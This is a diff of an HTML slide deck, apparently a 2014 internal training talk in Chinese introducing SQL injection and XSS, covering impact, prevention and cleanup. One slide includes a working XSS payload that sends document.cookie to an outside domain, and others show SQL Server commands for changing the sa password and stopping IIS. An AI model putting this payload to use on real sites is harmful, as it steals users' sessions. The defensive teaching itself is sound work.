@@ -10,14 +10,18 @@
 	<link href="talk.css" rel="stylesheet" />
 	<script src="prefixfree.min.js"></script>
 </head>
-<body data-duration="10">
+<body data-duration="60">
 
 <header id="intro" class="slide">
-	<h1>
-	     sql注入与xss攻击基础介绍
-	</h2>
-	<p class="attribution">robin luo</p>
+<p>
+<br/>
+<br/>
+	<h2>sql注入与xss攻击<h2>
+        <h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基础介绍 2014-09-26</h1>
+</p>       
+	<p class="attribution">盛大游戏-计费平台中心-robin luo</p>
 </header>
+
 <section>
 	<header class="slide">
 		<h1>SQL 注入</h1>
@@ -36,7 +40,7 @@
 			<li class="delayed">数据库服务器被攻击，系统管理员账户被窜改（例如ALTER LOGIN sa WITH PASSWORD='xxxxxx'）。</li>
 			<li class="delayed">取得系统较高权限后，有可能得以在网页加入恶意链接以及XSS。</li>
 			<li class="delayed">经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如xp_cmdshell "net stop iisadmin"可停止服务器的IIS服务）。</li>
-                	<li class="delayed">......</li>
+                	<li class="delayed">DDOS攻击、网站变慢、触发安全绕过漏洞......</li>
 
 		</ul>
 	</section>
@@ -61,9 +65,9 @@
 
 也就是实际上运行的SQL命令会变成下面这样的
 
- <pre><code lang="sql">strSQL = "SELECT * FROM users;" </code></pre>
+ <pre><code lang="sql">strSQL = "SELECT * FROM users;" </code></pre></p>
 
-因此达到无账号密码，亦可登录网站。所以SQL注入攻击被俗称为黑客的填空游戏。</p>
+<p class="delayed">因此达到无账号密码，亦可登录网站。所以SQL注入攻击被俗称为黑客的填空游戏。</p>
 	</section>
 
 	<section class="slide">
@@ -74,11 +78,12 @@
 	<section class="slide">
 		<h2>防范</h2>
 	
-		<p>子曰：病从口入. 控制输入</p>
+		<p>子曰：病从口入,祸从口出.所以要控制输入输出</p>
                 	<ul>
 			<li class="delayed">在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。</li>
 			<li class="delayed">在组合SQL字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续2个单引号字符）。</li>
                         <li class="delayed">使用防注入框架。</li>
+                        <li class="delayed">如果允许用户输入特殊文字，则在输出的地方也要谨慎控制、转移，比如json里出现引号会导致解析失败。</li>
                         <li class="delayed">还有很多...</li>
                       </ul>
 
@@ -91,170 +96,89 @@
 	</header>
 	
 	<section class="slide">
-		<h2>Thumbnail view</h2>
-		<p>Press Ctrl+H (or Shift+H if you're in Opera) now.</p>
-		<p class="delayed">Cool, huh? You can press Ctrl+Shift+H to see all slides (warning: can be slow!)</p>
+		<h2>What is it?</h2>
+		<p>跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）,是一种网站应用程序的安全漏洞攻击，是代码注入的一种。</p>
+		<p class="delayed" >Cross-site scripting的缩写是CSS，但因为CSS在网页设计领域已经被广泛指层叠样式表（Cascading Style Sheets），所以将Cross改以发音相近的X做为缩写 </p>
+                <p class="delayed">恶意使用者将代码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了HTML以及使用者端脚本语言。 </p>
+<p></p>
 	</section>
 	
 	<section class="slide">
-		<h2>Timer</h2>
-		<ul>
-			<li>Timer in the form of a progress bar on the top</li>
-			<li>Define the talk duration with the attribute <code>data-duration</code> on the <code>body</code></li>
-			<li>Style the timer and the end state with the selectors <code>#timer</code> and <code>#timer.end</code> respectively.</li>
+		<h2>手段和目的</h2>
+                <p>攻击者使被攻击者在浏览器中执行脚本，然后收集来自被攻击者的数据（如cookie或其他敏感信息），让被攻击者通过JavaScript等方式把收集好的数据作为参数提交到攻击者的服务器上。</p>
+<p>****</p>
+		<ul class="delayed">
+			<li class="delayed">cookie丢失有什么坏处？</li>
+			<li class="delayed">模拟受害者发微博、修改敏感信息、转账....</li>
+                        <li class="delayed">演示</li>
 		</ul>
 	</section>
 	
 	<section class="slide">
-		<h2>Presenter view</h2>
-		<p>This slide has presenter notes. They are only visible in presenter view (Ctrl+P or Shift+P).</p>
-		<p class="presenter-notes">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
+		<h2>如何攻击</h2>
+                <p class="delayed">如果一个网站会把用户的输入或者querystring内容显示在网页上，就可能出现漏洞。</p>
+                <p class="delayed">比如论坛，示例:<a href="http://robindemo.sdo.com/comment.php" target="blank">http://robindemo.sdo.com/comment.php</a></p>
+		<pre class="delayed"><code lang="javascript"><script>document.createElement("img").src="http://sdkbus.com?"+document.cookie</script></code></pre>
+                
 	</section>
 	
-	<section class="slide">
-		<style scoped>
-			h2 {
-				font-size: 200%;
-				font-weight: bold;
-			}
-		</style>
-		<h2><code>&lt;style scoped /&gt;</code></h2>
-		<p>You can use the HTML5 <code>scoped</code> attribute on style elements in slides, to only style the current slide or inside sections that include multiple slides to style all of them and nothing else.</p>
-		<p>For example, inspect this slide and then run <code>$$('style[scoped]')[0].sheet.cssRules[0].selectorText</code> in the console to see how the original selector gets changed.</p>
-	</section>
 	
 	<section class="slide">
-		<h2>More features</h2>
+		<h2>防范</h2>
+                <p>子曰：病从口入,祸从口出.所以要控制输入输出</p>
+
 		<ul>
-			<li class="delayed">IDs are dynamically assigned by JavaScript&hellip;</li>
-			<li class="delayed">&hellip;but you can also assign your own, bringing the best of both worlds</li>
-			<li class="delayed">Incremental display of slide contents (just add <code>class="delayed"</code>)</li>
-			<li class="delayed">Slide scaling based on window size (size everything you want to be scalable in ems)</li>
-			<li class="delayed">Document.title changing according to slide title (fetched either from the <code>title</code> attribute or the slide's heading)</li>
+			<li class="delayed">转义或过滤  REF:<a href="http://robindemo.sdo.com/step.php" target="blank">http://robindemo.sdo.com/step.php</a></li>
+                        <li class="delayed">使用相关的库函数
+<pre><code>
+    PHP的htmlentities()或是htmlspecialchars()。
+    Python的cgi.escape()。
+    ASP的Server.HTMLEncode()。
+    ASP.NET的Server.HtmlEncode()
+    Java的xssprotect(Open Source Library)。
+    Node.js的node-validator。
+</code></pre>
+
+</li>
 		</ul>
 	</section>
 	
-	<section class="slide">
-		<h2>Drawbacks</h2>
-		<ul>
-			<li>Only supports modern browsers. Why?
-				<ul>
-					<li>More lightweight</li>
-					<li>Easier to understand code</li>	
-					<li>It's a presentation, so the environment is controlled anyway</li>
-				</ul>
-			</li>
-			<li>No mouse click to advance to the next slide. I consider it annoying.</li>
-			<li>Doesn't work in mobile :(</li>
-		</ul>
-	</section>
 </section>
 
 <section>
 	<header class="slide">
-		<h1>Plugins</h1>
+		<h1>灾难应对</h1>
 	</header>
 	
 	<section class="slide">
-		<h2>Plugin: CSS Snippets</h2>
-		<pre>new CSSSnippet(document.getElementById('snippet'));</pre>
+		<h1>如果已经发生了，就要去弥补</h1>
 		<ul>
-			<li>Dynamically edit CSS and reflect the results in any element's style
+			<li>DataBase
 				<ul>
-					<li>Which one? Specify a selector with the <code>data-subject</code> attribute or leave blank for the slide to be the subject</li>
+					<li>找出被污染的数据，防止次生灾害</li>
+					<li>有快照，用快照还原，无快照的及时补上</li>
 				</ul>
-			<li>Automatically prefixes CSS3 properties/values, when needed
+			<li>程序
 				<ul>
-					<li>Also does it with the style attribute (statically) if the element is not a text field (doesn't work in IE and Firefox 3.6)</li>
+					<li>针对性过滤</li>
+					<li>加强自动测试</li>
 				</ul>
 			</li>
-			<li>Textarea automatically adjusts rows/font-size on line break (use class <code>dont-adjust</code> to turn off)</li>
+			<li>梳理其他代码、系统</li>
 		</ul>
 	</section>
 	
-	<section class="slide">
-		<h2>CSS Snippets demo</h2>
-		<p>Edit the following CSS code:</p>
-		<textarea class="snippet">background-color:red;
-background-image: linear-gradient(red, #600)</textarea>
-	</section>
-	
-	<section class="slide" id="animation-demo">
-		<h2>CSS Snippets: raw CSS</h2>
-		<textarea class="snippet" data-raw>@keyframes rainbow {
-	from, to { background: red }
-	16% { background: yellow }
-	33% { background: green }
-	50% { background: aqua }
-	66% { background: blue }
-	83% { background: fuchsia }
-}
-
-#animation-demo { animation: 30s rainbow infinite; }</textarea>
-	</section>
-	
-	<section class="slide">
-		<h2>Plugin: CSS Controls</h2>
-		<ul>
-			<li>Use sliders and other controls to adjust CSS values
-				<ul>
-					<li>Which one? Specify a selector with the <code>data-subject</code> attribute or leave blank for the slide to be the subject</li>
-					<li>Specify style with <code>data-style</code> (use <code>{value}</code> where the result will be)</li>
-				</ul>
-			<li>Automatically prefixes CSS3 properties/values, when needed</li>
-		</ul>
-	</section>
-	
-	<section class="slide" id="css-controls-demo">
-		<h2>CSS Controls demo</h2>
-		<label>Slide lightness: 
-			<input type="range" min="0" max="255" value="128" data-style="background-color:rgb({value}, {value}, {value});" class="css-control" />
-		</label>
-		<label>
-			border-width:
-			<input type="number" min="0" max="60" value="30" data-style="border-width: {value}px;" class="css-control" size="5" />
-		</label>
-		<label>
-			font-family:
-			<select data-style="font-family: {value};" class="css-control">
-				<option selected>sans-serif</option>
-				<option>Georgia, serif</option>
-				<option>Consolas, monospace</option>
-				<option>'Trebuchet MS', sans-serif</option>
-			</select>
-		</label>
-	</section>
-	
-	<section class="slide">
-		<h2>Plugin: Code highlight</h2>
-		<ul>
-			<li>Syntax highlighting for every <code>&lt;code&gt;</code> element with a <code>lang</code> attribute.</li>
-			<li>Only highlights when the slide becomes active, for performance</li>
-			<li>Currently only supports JavaScript, but it's easy to add any language</li>
-			<li>Styling done through easy to understand classes like <code>.string</code> or <code>.comment</code></li>
-		</ul>
-	</section>
-	
-	<section class="slide">
-		<h2>Code highlight example</h2>
-		<pre><code lang="javascript">// Comment
-document.addEventListener('DOMAttrModified',function(e) {
-  var node = e.target, attr = e.attrName;
-  if(/^input$/i.test(node.nodeName) 
-    &amp;&amp; (attr === 'placeholder' || attr === 'value')
-    || foo > 5)
-      Placeholder.update(node);
-}, false);</code></pre>
-	</section>
 </section>
 <footer class="slide" title="The End">
 	<h2>Thank you!</h2>
-	<p>Get it or contribute at <a href="http://github.com/LeaVerou/CSSS">http://github.com/LeaVerou/CSSS</a></p>
-	<p>Credits:</p>
-	<ul>
-		<li><a href="http://lukeroberts.us/2008/12/wallpaper-colourful-wood/">Colored wood background by Luke Roberts</a></li>
-		<li>The name CSSS is actually inspired by S5, as you could probably guess ;-)</li>
-		<li>A big thanks to the community at Github for various contributions to this project</li>
+<h2>********</h2>
+
+        <h2>Q&A</h2>
+	<p>Thanks To:</p>
+	<ul class="delayed">
+		<li>http://github.com/LeaVerou/CSSS</li>
+		<li>https://code.google.com/p/google-code-prettify</li>
+		<li>http://zh.wikipedia.org/</li>
 	</ul>
 </footer>
 
